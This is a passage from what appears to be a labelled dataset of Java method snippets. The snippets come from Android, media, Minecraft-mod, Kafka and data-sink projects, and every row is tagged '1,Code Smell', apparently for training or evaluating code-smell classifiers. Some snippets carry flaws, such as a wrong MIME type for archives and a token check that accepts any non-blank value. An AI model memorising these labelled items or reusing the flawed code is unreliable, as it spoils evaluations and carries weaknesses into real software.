  if (Bug.FRG189_FIXED || (getClass() != SqlOperatorTest.class) && Bug.TODO_FIXED) {
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(1))) FROM (VALUES(2))"",""RecordType(INTEGER NOT NULL EXPR$0, INTEGER EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(CAST(10 as BIGINT)))) "" + ""FROM (VALUES(CAST(10 as bigint)))"",""RecordType(BIGINT NOT NULL EXPR$0, BIGINT EXPR$1) NOT NULL"");
    tester.checkType("" SELECT *,(SELECT * FROM (VALUES(10.5))) FROM (VALUES(10.5))"",""RecordType(DECIMAL(3, 1) NOT NULL EXPR$0, DECIMAL(3, 1) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES('this is a char'))) "" + ""FROM (VALUES('this is a char too'))"",""RecordType(CHAR(18) NOT NULL EXPR$0, CHAR(14) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,(SELECT * FROM (VALUES(true))) FROM (values(false))"",""RecordType(BOOLEAN NOT NULL EXPR$0, BOOLEAN EXPR$1) NOT NULL"");
    tester.checkType("" SELECT *,(SELECT * FROM (VALUES(cast('abcd' as varchar(10))))) "" + ""FROM (VALUES(CAST('abcd' as varchar(10))))"",""RecordType(VARCHAR(10) NOT NULL EXPR$0, VARCHAR(10) EXPR$1) NOT NULL"");
    tester.checkType(""SELECT *,"" + ""  (SELECT * FROM (VALUES(TIMESTAMP '2006-01-01 12:00:05'))) "" + ""FROM (VALUES(TIMESTAMP '2006-01-01 12:00:05'))"",""RecordType(TIMESTAMP(0) NOT NULL EXPR$0, TIMESTAMP(0) EXPR$1) NOT NULL"");
  }
}",1,Code Smell
"@Override public void checkRepeatData(CfCarParkLinkUser cfCarParkLinkUser){
  CfCarParkLinkUserQuery cfCarParkLinkUserQuery=new CfCarParkLinkUserQuery();
  cfCarParkLinkUserQuery.setUid(cfCarParkLinkUser.getUid());
  cfCarParkLinkUserQuery.setCarParkId(cfCarParkLinkUser.getCarParkId());
  cfCarParkLinkUserQuery.setPage(1);
  cfCarParkLinkUserQuery.setSize(1);
  List<CfCarParkLinkUser> cfCarParkLinkUsers=getListByQuery(cfCarParkLinkUserQuery);
  if (cfCarParkLinkUsers != null && cfCarParkLinkUsers.size() > 0) {
    if ((StringUtils.isNotEmpty(cfCarParkLinkUser.getId()) && !cfCarParkLinkUsers.get(0).getId().equals(cfCarParkLinkUser.getId())) || StringUtils.isEmpty(cfCarParkLinkUser.getId())) {
      ExceptionCast.cast(CommonCode.DUPLICATE_DATA);
    }
  }
}",1,Code Smell
"private int scrollOffsetForQuote(MessageObject object){
  if (TextUtils.isEmpty(highlightMessageQuote) || object == null) {
    if (dummyMessageCell != null) {
      dummyMessageCell.computedGroupCaptionY=0;
      dummyMessageCell.computedCaptionLayout=null;
    }
    return 0;
  }
  int offsetY;
  CharSequence text;
  ArrayList<MessageObject.TextLayoutBlock> textLayoutBlocks;
  if (!TextUtils.isEmpty(object.caption) && dummyMessageCell != null && dummyMessageCell.captionLayout != null) {
    offsetY=(int)dummyMessageCell.captionY;
    text=object.caption;
    textLayoutBlocks=dummyMessageCell.captionLayout.textLayoutBlocks;
  }
 else {
    offsetY=0;
    text=object.messageText;
    textLayoutBlocks=object.textLayoutBlocks;
    if (dummyMessageCell != null && dummyMessageCell.linkPreviewAbove) {
      offsetY+=dummyMessageCell.linkPreviewHeight + dp(10);
    }
  }
  if (dummyMessageCell != null) {
    dummyMessageCell.computedGroupCaptionY=0;
    dummyMessageCell.computedCaptionLayout=null;
  }
  if (textLayoutBlocks == null || text == null) {
    return 0;
  }
  int index=MessageObject.findQuoteStart(text.toString(),highlightMessageQuote,highlightMessageQuoteOffset);
  if (index < 0) {
    return 0;
  }
  for (int i=0; i < textLayoutBlocks.size(); ++i) {
    MessageObject.TextLayoutBlock block=textLayoutBlocks.get(i);
    StaticLayout layout=block.textLayout;
    String layoutText=layout.getText().toString();
    if (index > block.charactersOffset) {
      final float y;
      if (index - block.charactersOffset > layoutText.length() - 1) {
        y=offsetY + (int)(block.textYOffset + block.padTop + block.height);
      }
 else {
        y=offsetY + block.textYOffset + block.padTop+ layout.getLineTop(layout.getLineForOffset(index - block.charactersOffset));
      }
      if (y > AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f)) {
        return (int)(y - AndroidUtilities.displaySize.y * (isKeyboardVisible() ? .7f : .5f));
      }
      return 0;
    }
  }
  return 0;
}",1,Code Smell
"@Override public void mouseClicked(MouseEvent e){
  if (locationToIndex(e.getPoint()) == -1 && !e.isShiftDown() && !isMenuShortcutKeyDown(e)) {
    clearSelection();
  }
}",1,Code Smell
"private int detectFastMove(final int x,final int y,final int time){
  final int size=getLength();
  final int lastIndex=size - 1;
  final int lastX=mXCoordinates.get(lastIndex);
  final int lastY=mYCoordinates.get(lastIndex);
  final int dist=getDistance(lastX,lastY,x,y);
  final int msecs=time - mEventTimes.get(lastIndex);
  if (msecs > 0) {
    final int pixels=getDistance(lastX,lastY,x,y);
    final int pixelsPerSec=pixels * MSEC_PER_SEC;
    if (DEBUG_SPEED) {
      final float speed=(float)pixelsPerSec / msecs / mKeyWidth;
      Log.d(TAG,String.format(Locale.US,""[%d] detectFastMove: speed=%5.2f"",mPointerId,speed));
    }
    if (!hasDetectedFastMove() && pixelsPerSec > mDetectFastMoveSpeedThreshold * msecs) {
      if (DEBUG) {
        final float speed=(float)pixelsPerSec / msecs / mKeyWidth;
        Log.d(TAG,String.format(Locale.US,""[%d] detectFastMove: speed=%5.2f T=%3d points=%3d fastMove"",mPointerId,speed,time,size));
      }
      mDetectFastMoveTime=time;
      mDetectFastMoveX=x;
      mDetectFastMoveY=y;
    }
  }
  return dist;
}",1,Code Smell
"public boolean canTranslatePhoto(MessageObject messageObject,String detectedLanguage){
  if (messageObject != null && messageObject.messageOwner != null && messageObject.messageOwner.originalLanguage != null) {
    detectedLanguage=messageObject.messageOwner.originalLanguage;
  }
  return messageObject != null && messageObject.messageOwner != null && !TextUtils.isEmpty(messageObject.messageOwner.message) && (detectedLanguage == null && messageObject.messageOwner.translatedText != null && TextUtils.equals(messageObject.messageOwner.translatedToLanguage,TranslateAlert2.getToLanguage()) || detectedLanguage != null && !RestrictedLanguagesSelectActivity.getRestrictedLanguages().contains(messageObject.messageOwner.originalLanguage)) && !messageObject.translated;
}",1,Code Smell
"@Override @SuppressWarnings(""ReferenceEquality"") public void onTracksChanged(TrackGroupArray trackGroups,TrackSelectionArray trackSelections){
  updateButtonVisibility();
  if (trackGroups != lastSeenTrackGroupArray) {
    MappedTrackInfo mappedTrackInfo=trackSelector.getCurrentMappedTrackInfo();
    if (mappedTrackInfo != null) {
      if (mappedTrackInfo.getTypeSupport(C.TRACK_TYPE_VIDEO) == MappedTrackInfo.RENDERER_SUPPORT_UNSUPPORTED_TRACKS) {
        showToast(R.string.error_unsupported_video);
      }
      if (mappedTrackInfo.getTypeSupport(C.TRACK_TYPE_AUDIO) == MappedTrackInfo.RENDERER_SUPPORT_UNSUPPORTED_TRACKS) {
        showToast(R.string.error_unsupported_audio);
      }
    }
    lastSeenTrackGroupArray=trackGroups;
  }
}
",1,Code Smell
"/** 
 * {@inheritDoc} 
 */
@Override public void visitConstant(int opcode,int offset,int length,Constant cst,int value){
  visitCommon(offset,length,true);
  if (cst instanceof CstMemberRef || cst instanceof CstType || cst instanceof CstString|| cst instanceof CstInvokeDynamic|| cst instanceof CstMethodHandle|| cst instanceof CstProtoRef) {
    visitThrowing(offset,length,true);
  }
}
",1,Code Smell
"private Result<Boolean> updateZKAcl(KafkaZkClient kafkaZkClient,ResourcePattern resourcePattern,AclEntry aclEntry,boolean deleteAcl){
  AclAuthorizer.VersionedAcls versionedAcls=kafkaZkClient.getVersionedAclsForResource(resourcePattern);
  Set<AclEntry> aclEntrySet=new HashSet<>(CollectionConverters.asJava(versionedAcls.acls()));
  if ((deleteAcl && !aclEntrySet.contains(aclEntry)) || (!deleteAcl && aclEntrySet.contains(aclEntry))) {
    return Result.buildSuc(Boolean.TRUE);
  }
  if (deleteAcl) {
    aclEntrySet.remove(aclEntry);
  }
 else {
    aclEntrySet.add(aclEntry);
  }
  if (aclEntrySet.isEmpty()) {
    return kafkaZkClient.deleteResource(resourcePattern) ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
 else   if (ZkVersion.UnknownVersion() == versionedAcls.zkVersion()) {
    return (boolean)kafkaZkClient.createAclsForResourceIfNotExists(resourcePattern,CollectionConverters.asScala(aclEntrySet).toSet())._1() ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
 else {
    return (boolean)kafkaZkClient.conditionalSetAclsForResource(resourcePattern,CollectionConverters.asScala(aclEntrySet).toSet(),versionedAcls.zkVersion())._1() ? Result.buildSuc(Boolean.TRUE) : Result.buildSuc(Boolean.FALSE);
  }
}",1,Code Smell
"/** 
 * Asserts  {@link SampleQueue#read} is behaving correctly, given there are no samples to read andthe last format to be written to the sample queue is  {@code endFormat}.
 * @param endFormat The last format to be written to the sample queue, or null of no format hasbeen written.
 */
private void assertNoSamplesToRead(Format endFormat){
  assertReadNothing(false);
  if (endFormat == null) {
    assertReadNothing(true);
  }
 else {
    assertReadFormat(true,endFormat);
  }
  assertReadEndOfStream(false);
  assertReadEndOfStream(true);
  assertReadNothing(false);
  if (endFormat == null) {
    assertReadNothing(true);
  }
 else {
    assertReadFormat(true,endFormat);
  }
}
",1,Code Smell
"@Override public void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info){
  super.onInitializeAccessibilityNodeInfo(info);
  if (getImageReceiver().hasNotThumb()) {
    info.setText(LocaleController.getString(""AccDescrProfilePicture"",R.string.AccDescrProfilePicture));
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
      info.addAction(new AccessibilityNodeInfo.AccessibilityAction(AccessibilityNodeInfo.ACTION_CLICK,LocaleController.getString(""Open"",R.string.Open)));
      info.addAction(new AccessibilityNodeInfo.AccessibilityAction(AccessibilityNodeInfo.ACTION_LONG_CLICK,LocaleController.getString(""AccDescrOpenInPhotoViewer"",R.string.AccDescrOpenInPhotoViewer)));
    }
  }
 else {
    info.setVisibleToUser(false);
  }
}
@Override public void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info){
  super.onInitializeAccessibilityNodeInfo(info);
  if (isFocusable() && (nameTextViewRightDrawableContentDescription != null || nameTextViewRightDrawable2ContentDescription != null)) {
    StringBuilder s=new StringBuilder(getText());
    if (nameTextViewRightDrawable2ContentDescription != null) {
      if (s.length() > 0)       s.append("", "");
      s.append(nameTextViewRightDrawable2ContentDescription);
    }
    if (nameTextViewRightDrawableContentDescription != null) {
      if (s.length() > 0)       s.append("", "");
      s.append(nameTextViewRightDrawableContentDescription);
    }
    info.setText(s);
  }
}",1,Code Smell
"public static void setEpicenterCallback(Object transition,final TransitionEpicenterCallback callback){
  if (Build.VERSION.SDK_INT >= 21) {
    if (callback == null) {
      ((Transition)transition).setEpicenterCallback(null);
    }
 else {
      ((Transition)transition).setEpicenterCallback(new Transition.EpicenterCallback(){
        @Override public Rect onGetEpicenter(        Transition transition11){
          return callback.onGetEpicenter(transition11);
        }
      }
);
    }
  }
}",1,Code Smell
"@Override public void render(ForgeGui gui,GuiGraphics graphics,float partialTicks,int width,int height){
  Minecraft mc=Minecraft.getInstance();
  if (mc.options.hideGui || mc.gameMode.getPlayerMode() == GameType.SPECTATOR)   return;
  if (TrackPlacement.hoveringPos == null)   return;
  if (TrackPlacement.cached == null || TrackPlacement.cached.curve == null || !TrackPlacement.cached.valid)   return;
  if (TrackPlacement.extraTipWarmup < 4)   return;
  if (ObfuscationReflectionHelper.getPrivateValue(Gui.class,gui,""f_92993_"") instanceof Integer && toolHighlightTimer > 0)   return;
  boolean active=mc.options.keySprint.isDown();
  MutableComponent text=Lang.translateDirect(""track.hold_for_smooth_curve"",Components.keybind(""key.sprint"").withStyle(active ? ChatFormatting.WHITE : ChatFormatting.GRAY));
  Window window=mc.getWindow();
  int x=(window.getGuiScaledWidth() - gui.getFont().width(text)) / 2;
  int y=window.getGuiScaledHeight() - 61;
  Color color=new Color(0x4ADB4A).setAlpha(Mth.clamp((TrackPlacement.extraTipWarmup - 4) / 3f,0.1f,1));
  graphics.drawString(gui.getFont(),text,x,y,color.getRGB(),false);
}",1,Code Smell
"public static JsonNode getChildQueues(JsonNode resp){
  JsonNode queues=resp.get(""childQueues"").get(""queue"");
  if (queues != null && !queues.isNull() && !queues.isMissingNode() && queues.isArray() && queues.size() > 0) {
    return queues;
  }
 else {
    return resp.get(""childQueues"");
  }
}",1,Code Smell
"@Override public void tick(){
  super.tick();
  if (level.isClientSide) {
    createFluidParticles();
    tickVisualizedOutputs();
    ingredientRotationSpeed.tickChaser();
    ingredientRotation.setValue(ingredientRotation.getValue() + ingredientRotationSpeed.getValue());
  }
  if ((!spoutputBuffer.isEmpty() || !spoutputFluidBuffer.isEmpty()) && !level.isClientSide)   tryClearingSpoutputOverflow();
  if (!contentsChanged)   return;
  contentsChanged=false;
  getOperator().ifPresent(be -> be.basinChecker.scheduleUpdate());
  for (  Direction offset : Iterate.horizontalDirections) {
    BlockPos toUpdate=worldPosition.above().relative(offset);
    BlockState stateToUpdate=level.getBlockState(toUpdate);
    if (stateToUpdate.getBlock() instanceof BasinBlock && stateToUpdate.getValue(BasinBlock.FACING) == offset.getOpposite()) {
      BlockEntity be=level.getBlockEntity(toUpdate);
      if (be instanceof BasinBlockEntity)       ((BasinBlockEntity)be).contentsChanged=true;
    }
  }
}
",1,Code Smell
"@Override public void paintBorder(Component c,Graphics g,int x,int y,int width,int height){
  if (FlatButtonUI.isContentAreaFilled(c) && !FlatButtonUI.isToolBarButton(c) && (!FlatButtonUI.isBorderlessButton(c) || FlatUIUtils.isPermanentFocusOwner(c))&& !FlatButtonUI.isHelpButton(c)&& !FlatToggleButtonUI.isTabButton(c))   super.paintBorder(c,g,x,y,width,height);
 else   if (FlatButtonUI.isToolBarButton(c) && isFocused(c))   paintToolBarFocus(c,g,x,y,width,height);
}
",1,Code Smell
"/** 
 * Returns the next BlockPosition in the trace
 * @return the next BlockPosition in the trace
 */
@Override public Point next(){
  if (foundEnd)   throw new NoSuchElementException();
  if (!extraPoints.isEmpty()) {
    var res=extraPoints.poll();
    if (end != null && res.sameBlock(end))     foundEnd=true;
    return res;
  }
  var current=new Vec(mapX,mapY,mapZ);
  if (end != null && current.sameBlock(end))   foundEnd=true;
  double closest=Math.min(sideDistX,Math.min(sideDistY,sideDistZ));
  boolean needsX=sideDistX - closest < 1e-10 && signums[0] != 0;
  boolean needsY=sideDistY - closest < 1e-10 && signums[1] != 0;
  boolean needsZ=sideDistZ - closest < 1e-10 && signums[2] != 0;
  if (needsZ) {
    sideDistZ+=deltaDistZ;
    mapZ+=signums[2];
  }
  if (needsX) {
    sideDistX+=deltaDistX;
    mapX+=signums[0];
  }
  if (needsY) {
    sideDistY+=deltaDistY;
    mapY+=signums[1];
  }
  if (needsX && needsY && needsZ) {
    extraPoints.add(new Vec(signums[0] + current.x(),signums[1] + current.y(),current.z()));
    if (smooth)     return current;
    extraPoints.add(new Vec(current.x(),signums[1] + current.y(),signums[2] + current.z()));
    extraPoints.add(new Vec(signums[0] + current.x(),current.y(),signums[2] + current.z()));
    extraPoints.add(new Vec(signums[0] + current.x(),current.y(),current.z()));
    extraPoints.add(new Vec(current.x(),signums[1] + current.y(),current.z()));
    extraPoints.add(new Vec(current.x(),current.y(),signums[2] + current.z()));
  }
 else   if (needsX && needsY) {
    extraPoints.add(new Vec(signums[0] + current.x(),current.y(),current.z()));
    if (smooth)     return current;
    extraPoints.add(new Vec(current.x(),signums[1] + current.y(),current.z()));
  }
 else   if (needsX && needsZ) {
    extraPoints.add(new Vec(signums[0] + current.x(),current.y(),current.z()));
    if (smooth)     return current;
    extraPoints.add(new Vec(current.x(),current.y(),signums[2] + current.z()));
  }
 else   if (needsY && needsZ) {
    extraPoints.add(new Vec(current.x(),signums[1] + current.y(),current.z()));
    if (smooth)     return current;
    extraPoints.add(new Vec(current.x(),current.y(),signums[2] + current.z()));
  }
  return current;
}",1,Code Smell
"/** 
 * 閫夐」鎶ヨ〃缁熻
 * @param data
 * @param answer
 */
private void parseAnswer(Map<String,ReportData.Data> data,LinkedHashMap answer){
  Iterator it=answer.entrySet().iterator();
  while (it.hasNext()) {
    Map.Entry pair=(Map.Entry)it.next();
    String id=(String)pair.getKey();
    Object value=pair.getValue();
    ReportData.Data optionData=data.computeIfAbsent(id,s -> new ReportData.Data());
    optionData.setTotal(optionData.getTotal() + 1);
    if (value instanceof Map) {
      parseAnswer(data,(LinkedHashMap)value);
    }
 else     if (value instanceof Number) {
      Number numberValue=(Number)value;
      if (optionData.getMin() == null || optionData.getMax() == null || optionData.getAverage() == null) {
        optionData.setMin(numberValue);
        optionData.setMax(numberValue);
        optionData.setAverage(numberValue);
      }
      if (compareTo(optionData.getMin(),numberValue) > 0) {
        optionData.setMin(numberValue);
      }
      if (compareTo(numberValue,optionData.getMax()) > 0) {
        optionData.setMax(numberValue);
      }
      optionData.setSum(new BigDecimal(optionData.getSum().doubleValue()).add(new BigDecimal(numberValue.doubleValue())));
      optionData.setAverage(new BigDecimal(optionData.getSum().doubleValue()).divide(new BigDecimal(optionData.getTotal()),2,RoundingMode.HALF_UP).setScale(2,BigDecimal.ROUND_HALF_UP));
    }
  }
}",1,Code Smell
"protected boolean testBreakerTarget(MovementContext context,BlockPos target,int columnY){
  BlockState stateToPaveWith=getStateToPaveWith(context);
  BlockState stateToPaveWithAsSlab=getStateToPaveWithAsSlab(context);
  BlockState stateAbove=context.world.getBlockState(target);
  if (columnY == 0 && stateAbove.is(stateToPaveWith.getBlock()))   return false;
  if (stateToPaveWithAsSlab != null && columnY == 1 && stateAbove.is(stateToPaveWithAsSlab.getBlock()))   return false;
  return canBreak(context.world,target,stateAbove);
}",1,Code Smell
"public void getBackupNames(OnBackupNames callback){
  if (FileHelpers.isExternalStorageReadable()) {
    if (PermissionHelpers.hasStoragePermissions(mContext)) {
      callback.onBackupNames(getBackupNames());
    }
 else {
      mPendingHandler=() -> callback.onBackupNames(getBackupNames());
      verifyStoragePermissionsAndReturn();
    }
  }
}
private List<String> getBackupNames(){
  File current=getBackup();
  if (current != null) {
    File parentFile=current.getParentFile();
    if (parentFile == null) {
      return null;
    }
    String[] list=parentFile.list();
    if (list == null) {
      return null;
    }
    List<String> result=new ArrayList<>();
    Arrays.sort(list);
    for (    String dirName : list) {
      if (dirName.startsWith(BACKUP_DIR_NAME)) {
        result.add(dirName);
      }
    }
    return result;
  }
  return null;
}
",1,Code Smell
"@Override public boolean identityValidUserInfo(ClientBroker.AuthorizedInfo authorizedInfo,boolean isProduce,ProcessResult result){
  if (authorizedInfo == null) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Authorized Info is required!"");
    return result.isSuccess();
  }
  if (enableVisitTokenCheck) {
    long curVisitToken=authorizedInfo.getVisitAuthorizedToken();
    List<Long> currList=visitTokenList.get();
    if (tubeBroker.isKeepAlive()) {
      if (!currList.contains(curVisitToken) && (System.currentTimeMillis() - tubeBroker.getLastRegTime() > inValidTokenCheckTimeMs)) {
        result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Visit Authorized Token is invalid!"");
        return result.isSuccess();
      }
    }
  }
  if ((isProduce && !enableProduceAuthenticate) || (!isProduce && !enableConsumeAuthenticate)) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  if (TStringUtils.isBlank(authorizedInfo.getAuthAuthorizedToken())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""authAuthorizedToken is Blank!"");
    return result.isSuccess();
  }
  result.setSuccResult(new CertifiedInfo());
  return result.isSuccess();
}
",1,Code Smell
"/** 
 * Replaces the double pushing instruction at the given offset by a simpler push instruction, if possible.
 */
private void replaceDoublePushInstruction(Clazz clazz,int offset,Instruction instruction){
  replaceDoublePushInstruction(clazz,offset,instruction,partialEvaluator.getVariablesBefore(offset).size());
}
/** 
 * Replaces the double pushing instruction at the given offset by a simpler push instruction, if possible.
 */
private void replaceDoublePushInstruction(Clazz clazz,int offset,Instruction instruction,int maxVariableIndex){
  Value pushedValue=partialEvaluator.getStackAfter(offset).getTop(0);
  if (pushedValue.isParticular()) {
    double value=pushedValue.doubleValue().value();
    if (value == 0.0 && Double.doubleToLongBits(value) == POS_ZERO_DOUBLE_BITS || value == 1.0) {
      replaceConstantPushInstruction(clazz,offset,instruction,Instruction.OP_DCONST_0,(int)value);
    }
 else {
      ConstantPoolEditor constantPoolEditor=new ConstantPoolEditor((ProgramClass)clazz);
      Instruction replacementInstruction=new ConstantInstruction(Instruction.OP_LDC2_W,constantPoolEditor.addDoubleConstant(value));
      replaceInstruction(clazz,offset,instruction,replacementInstruction);
    }
  }
 else   if (ENABLE_LOWER_SLOT_REPLACEMENT && pushedValue.isSpecific()) {
    TracedVariables variables=partialEvaluator.getVariablesBefore(offset);
    for (int variableIndex=0; variableIndex < maxVariableIndex; variableIndex++) {
      if (pushedValue.equals(variables.load(variableIndex)) && variables.load(variableIndex + 1) != null && variables.load(variableIndex + 1).computationalType() == Value.TYPE_TOP) {
        replaceVariablePushInstruction(clazz,offset,instruction,Instruction.OP_DLOAD,variableIndex);
      }
    }
  }
}",1,Code Smell
"public static UpdateInfo getUpdateInfo(Plugin plugin) throws Exception {
  Plugin.Manifest manifest=plugin.getManifest();
  if (manifest.updateUrl == null || manifest.updateUrl.equals(""""))   return null;
  String name=plugin.getName();
  CachedData cached=cache.get(manifest.updateUrl);
  if (cached != null && cached.time > System.currentTimeMillis() - TimeUnit.MINUTES.toMillis(30)) {
    UpdateInfo updateInfo=cached.data.get(name);
    UpdateInfo defaultInfo=cached.data.get(""default"");
    if (updateInfo == null)     return defaultInfo;
    addDefaultInfo(updateInfo,defaultInfo);
    return updateInfo;
  }
  Map<String,UpdateInfo> res=Http.simpleJsonGet(manifest.updateUrl,resType);
  if (res == null)   return null;
  cache.put(manifest.updateUrl,new CachedData(res));
  UpdateInfo updateInfo=res.get(name);
  UpdateInfo defaultInfo=res.get(""default"");
  if (updateInfo == null)   return defaultInfo;
  addDefaultInfo(updateInfo,defaultInfo);
  return updateInfo;
}",1,Code Smell
"private boolean sniffInternal(ExtractorInput input) throws IOException, InterruptedException {
  OggPageHeader header=new OggPageHeader();
  if (!header.populate(input,true) || (header.type & 0x02) != 0x02) {
    return false;
  }
  int length=Math.min(header.bodySize,MAX_VERIFICATION_BYTES);
  ParsableByteArray scratch=new ParsableByteArray(length);
  input.peekFully(scratch.data,0,length);
  if (FlacReader.verifyBitstreamType(resetPosition(scratch))) {
    streamReader=new FlacReader();
  }
 else   if (VorbisReader.verifyBitstreamType(resetPosition(scratch))) {
    streamReader=new VorbisReader();
  }
 else   if (OpusReader.verifyBitstreamType(resetPosition(scratch))) {
    streamReader=new OpusReader();
  }
 else {
    return false;
  }
  return true;
}",1,Code Smell
"/** 
 * Get the text in the CDATA block.
 * @return The string up to the <code>]]&gt;</code>.
 * @throws JSONException If the <code>]]&gt;</code> is not found.
 */
public String nextCDATA() throws JSONException {
  char c;
  int i;
  StringBuilder sb=new StringBuilder();
  while (more()) {
    c=next();
    sb.append(c);
    i=sb.length() - 3;
    if (i >= 0 && sb.charAt(i) == ']' && sb.charAt(i + 1) == ']' && sb.charAt(i + 2) == '>') {
      sb.setLength(i);
      return sb.toString();
    }
  }
  throw syntaxError(""Unclosed CDATA"");
}",1,Code Smell
"/** 
 * Creates View intent for given file
 * @param file
 * @return The intent for viewing file
 */
public static Intent getViewIntent(Context context,File file){
  Uri uri=FileProvider.getUriForFile(context,AUTHORITY,file);
  Intent intent=new Intent(Intent.ACTION_VIEW);
  String url=file.toString();
  if (url.contains("".doc"") || url.contains("".docx"")) {
    intent.setDataAndType(uri,""application/msword"");
  }
 else   if (url.contains("".pdf"")) {
    intent.setDataAndType(uri,""application/pdf"");
  }
 else   if (url.contains("".ppt"") || url.contains("".pptx"")) {
    intent.setDataAndType(uri,""application/vnd.ms-powerpoint"");
  }
 else   if (url.contains("".xls"") || url.contains("".xlsx"")) {
    intent.setDataAndType(uri,""application/vnd.ms-excel"");
  }
 else   if (url.contains("".zip"") || url.contains("".rar"")) {
    intent.setDataAndType(uri,""application/x-wav"");
  }
 else   if (url.contains("".rtf"")) {
    intent.setDataAndType(uri,""application/rtf"");
  }
 else   if (url.contains("".wav"") || url.contains("".mp3"")) {
    intent.setDataAndType(uri,""audio/x-wav"");
  }
 else   if (url.contains("".gif"")) {
    intent.setDataAndType(uri,""image/gif"");
  }
 else   if (url.contains("".jpg"") || url.contains("".jpeg"") || url.contains("".png"")) {
    intent.setDataAndType(uri,""image/jpeg"");
  }
 else   if (url.contains("".txt"")) {
    intent.setDataAndType(uri,""text/plain"");
  }
 else   if (url.contains("".3gp"") || url.contains("".mpg"") || url.contains("".mpeg"")|| url.contains("".mpe"")|| url.contains("".mp4"")|| url.contains("".avi"")) {
    intent.setDataAndType(uri,""video/*"");
  }
 else {
    intent.setDataAndType(uri,""*/*"");
  }
  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
  intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
  intent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
  return intent;
}",1,Code Smell
"@SuppressWarnings({""rawtypes""}) private void flushSingleTable(String tableIdentifier,List values){
  if (checkFlushException(tableIdentifier) || values == null || values.isEmpty()) {
    return;
  }
  String loadValue=null;
  RespContent respContent;
  try {
    String format=executionOptions.getStreamLoadProp().getProperty(FORMAT_KEY,FORMAT_JSON_VALUE);
    loadValue=serialize(tableIdentifier,values,format);
    respContent=load(tableIdentifier,loadValue);
    try {
      if (null != metricData && null != respContent) {
        if (multipleSink) {
          String[] tableWithDb=tableIdentifier.split(""\\."");
          metricData.outputMetrics(tableWithDb[0],tableWithDb[1],respContent.getNumberLoadedRows(),respContent.getLoadBytes());
        }
 else {
          metricData.invoke(respContent.getNumberLoadedRows(),respContent.getLoadBytes());
        }
      }
    }
 catch (    Exception e) {
      LOG.warn(""metricData invoke get err:"",e);
    }
    writeOutNum.addAndGet(values.size());
    values.clear();
  }
 catch (  Exception e) {
    LOG.error(String.format(""Flush table: %s error"",tableIdentifier),e);
    flushExceptionMap.put(tableIdentifier,e);
    errorNum.getAndAdd(values.size());
    if (!multipleSink) {
      try {
        handleSingleTable(e,values,loadValue);
        return;
      }
 catch (      Exception ex) {
        throw new RuntimeException(e);
      }
    }
    if (SchemaUpdateExceptionPolicy.THROW_WITH_STOP == schemaUpdatePolicy) {
      throw new RuntimeException(String.format(""Writing records to streamload of tableIdentifier:%s failed, the value: %s."",tableIdentifier,loadValue),e);
    }
    if (SchemaUpdateExceptionPolicy.STOP_PARTIAL == schemaUpdatePolicy) {
      errorTables.add(tableIdentifier);
      LOG.warn(""The tableIdentifier: {} load failed and the data will be throw away in the future "" + ""because the option 'sink.multiple.schema-update.policy' is 'STOP_PARTIAL'"",tableIdentifier);
      return;
    }
    if (SchemaUpdateExceptionPolicy.LOG_WITH_IGNORE == schemaUpdatePolicy) {
      errorTables.add(tableIdentifier);
      for (      Object value : values) {
        try {
          handleDirtyData(OBJECT_MAPPER.readTree(OBJECT_MAPPER.writeValueAsString(value)),DirtyType.BATCH_LOAD_ERROR,e);
        }
 catch (        Exception ex) {
          if (!dirtySinkHelper.getDirtyOptions().ignoreSideOutputErrors()) {
            throw new RuntimeException(ex);
          }
          LOG.warn(""Dirty sink failed"",ex);
        }
      }
    }
    values.clear();
  }
}",1,Code Smell
"@Override public void onScrubMove(TimeBar timeBar,long position){
  reportScrubbing(position);
  for (  long start : chapterStarts) {
    if ((lastScrubbingPosition < start && position >= start) || (lastScrubbingPosition > start && position <= start)) {
      playerView.performHapticFeedback(HapticFeedbackConstants.CLOCK_TICK);
    }
  }
  lastScrubbingPosition=position;
}
",1,Code Smell
"private void updateAudioPlayer(boolean updateSeek){
  if (audioPlayer == null || entry == null) {
    return;
  }
  if (videoPlayer == null && roundPlayer == null) {
    audioPlayer.setPlayWhenReady(pauseLinks.isEmpty());
    audioPlayer.setLooping(true);
    long pos=audioPlayer.getCurrentPosition();
    if (updateSeek && audioPlayer.getDuration() != C.TIME_UNSET) {
      final float progress=pos / (float)audioPlayer.getDuration();
      if ((progress < entry.audioLeft || progress > entry.audioRight) && System.currentTimeMillis() - seekedLastTime > MIN_DURATION / 2) {
        seekedLastTime=System.currentTimeMillis();
        audioPlayer.seekTo(pos=-entry.audioOffset);
      }
    }
    return;
  }
  VideoPlayer player=videoPlayer != null ? videoPlayer : roundPlayer;
  final long pos=player.getCurrentPosition();
  final long duration=(long)((entry.audioRight - entry.audioLeft) * entry.audioDuration);
  boolean shouldPlaying=player.isPlaying() && pos >= entry.audioOffset && pos <= entry.audioOffset + duration;
  long audioPos=pos - entry.audioOffset + (long)(entry.audioLeft * entry.audioDuration);
  if (audioPlayer.isPlaying() != shouldPlaying) {
    audioPlayer.setPlayWhenReady(shouldPlaying);
    audioPlayer.seekTo(audioPos);
  }
 else   if (updateSeek && Math.abs(audioPlayer.getCurrentPosition() - audioPos) > 120) {
    audioPlayer.seekTo(audioPos);
  }
}",1,Code Smell
"private LinkSpanDrawable checkTouchTextLayout(StaticLayout textLayout,int textX,int textY,int ex,int ey){
  try {
    int x=(int)(ex - textX);
    int y=(int)(ey - textY);
    final int line=textLayout.getLineForVertical(y);
    final int off=textLayout.getOffsetForHorizontal(line,x);
    final float left=textLayout.getLineLeft(line);
